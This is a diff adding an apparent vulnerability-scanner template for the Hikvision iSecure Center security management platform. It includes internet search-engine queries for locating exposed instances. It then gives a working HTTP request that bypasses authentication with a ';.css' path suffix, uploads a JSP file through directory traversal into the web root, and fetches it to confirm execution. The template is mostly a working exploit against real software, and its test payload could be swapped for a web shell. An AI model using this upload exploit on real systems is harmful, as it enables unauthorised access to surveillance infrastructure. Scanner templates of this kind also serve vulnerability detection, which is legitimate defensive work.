@@ -1,0 +1,62 @@
+name: haikang-zonghe-lm-upload
+detail:
+  author: 
+  links:
+    - 
+  vulnerability:
+    level: critical
+    fofa-query: app="HIKVISION-综合安防管理平台"
+    hunter-query: app.name="Hikvision 海康威视 iSecure Center"
+    quake-query: app:"海康威视-综合安防管理平台"
+    zoomeye-query: title:"综合安防管理平台"
+    threatbook-query: 
+    cve: 
+    tips: 
+
+transport: http
+set:
+    s1: randomInt(1000000000, 9000000000)
+    s2: randomLowercase(8)
+    s3: randomLowercase(8)
+    rboundary: randomInt(800000000, 1000000000)
+    reverse: newReverse()
+    reverseURL: reverse.url
+    t1: timeConvert(now(), '2006-01-02')
+    t2: timeConvert(now(), '2006-01')
+    b1: base64Decode("")
+    h1: hexDecode("")
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /lm/api/files;.css
+      follow_redirects: false
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/41.0.887.0 Safari/532.1
+        Accept-Encoding: gzip, deflate
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryVBf7Cs8QWsfwC82M
+        SL-CE-SUID: 39
+      body: "------WebKitFormBoundaryVBf7Cs8QWsfwC82M\r\nContent-Disposition: form-data; name=\"file\"; filename=\"../../../../../tomcat85linux64.1/webapps/els/static/bottlle.jsp\"\r\nContent-Type: application/zip\r\n\r\n<% out.println(\"4ndex\");%>\r\n------WebKitFormBoundaryVBf7Cs8QWsfwC82M--"
+      
+    expression: response.status == 200 && (response.body_string.contains("bottlle.jsp") || response.body.bcontains(bytes("bottlle.jsp"))) && response.body_string.contains("code")
+
+    output:
+      search: |-
+        "(?P<rfile>\\w+.jsp)".bsubmatch(response.body)
+      rfile: search["rfile"]
+      search1: |-
+        '"date\":\"(?P<date>.+?)\",\"macaddr".bsubmatch(response.body)'
+      rdir: search["rdir"]
+
+  r1:
+    request:
+      method: GET
+      path: /els/static/bottlle.jsp
+      follow_redirects: false
+      headers:
+      body: 
+
+    expression: response.status == 200 && (response.body_string.contains("4ndex") || response.body.bcontains(bytes("4ndex")))
+    
+expression: r0() && r1()
